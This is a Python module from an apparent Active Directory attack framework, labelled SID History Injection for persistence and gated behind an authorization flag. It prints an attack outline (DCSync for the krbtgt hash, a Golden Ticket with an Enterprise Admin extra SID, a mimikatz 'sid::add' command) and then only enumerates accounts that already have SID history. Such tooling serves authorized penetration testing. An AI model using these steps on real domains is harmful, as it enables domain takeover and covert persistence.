"""SID History Injection  -  add privileged SID to a user's SID history for persistence."""


import sys
from typing import Any

from adxpl.core.credential import ADCredential


MANIFEST = {
    "capability_id": "adxpl.persistence.sid_history.v1",
    "safety_class": "ACTIVE",
    "requires_authorization": True,
    "side_effects": ["ad_object_modification"],
    "output_schema": "xpl.finding.v1",
    "mitre": ["T1134.005"],
}


def run(args: Any) -> int:
    cred = ADCredential.from_args(args)

    print(f"[*] SID History Injection → {args.target} ({args.domain})")

    try:
        from impacket.dcerpc.v5 import samr, transport
    except ImportError:
        print("[!] impacket not installed", file=sys.stderr)
        return 1

    if not cred.has_password and not cred.has_hash:
        print("[!] SID History injection requires DA credentials", file=sys.stderr)
        return 1

    print("[*] SID History injection adds Enterprise Admin SID to a regular user")
    print("[*] This provides cross-domain persistence when SID filtering is off")
    print()
    print("[*] Steps:")
    print("    1. DCSync to obtain krbtgt hash")
    print("    2. Golden Ticket with extra-sid (Enterprise Admin SID from target domain)")
    print("    3. Or: mimikatz 'sid::add /sam:targetuser /new:S-1-5-21-...-519'")
    print()

    from adxpl.core.ldap_session import connect, get_base_dn
    import ldap3
    import json

    conn = connect(args.target, cred)
    base_dn = get_base_dn(args.domain)

    conn.search(
        base_dn,
        "(sIDHistory=*)",
        attributes=["sAMAccountName", "sIDHistory", "memberOf"],
        search_scope=ldap3.SUBTREE,
        paged_size=1000,
    )

    if conn.entries:
        print(f"[+] Found {len(conn.entries)} objects with SID History:")
        for entry in conn.entries:
            data = json.loads(entry.entry_to_json())
            attrs = data.get("attributes", {})
            sam = attrs.get("sAMAccountName", "")
            sids = attrs.get("sIDHistory", [])
            print(f"    {sam}: {sids}")
    else:
        print("[-] No objects with SID History found")

    return 0
